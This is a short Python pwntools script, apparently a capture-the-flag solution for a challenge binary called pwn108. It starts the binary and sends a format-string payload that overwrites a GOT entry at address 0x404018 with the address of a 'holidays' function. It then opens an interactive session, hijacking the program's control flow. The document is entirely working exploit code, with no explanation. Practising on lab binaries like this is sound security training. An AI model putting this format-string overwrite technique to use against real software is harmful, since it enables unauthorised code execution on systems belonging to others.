from pwn import *

binary = context.binary = ELF("pwn108.pwn108")

p = binary.process()

payload = fmtstr_payload(10, {0x404018 : binary.sym.holidays})

p.sendline(b"booboo")
p.sendline(payload)

p.interactive()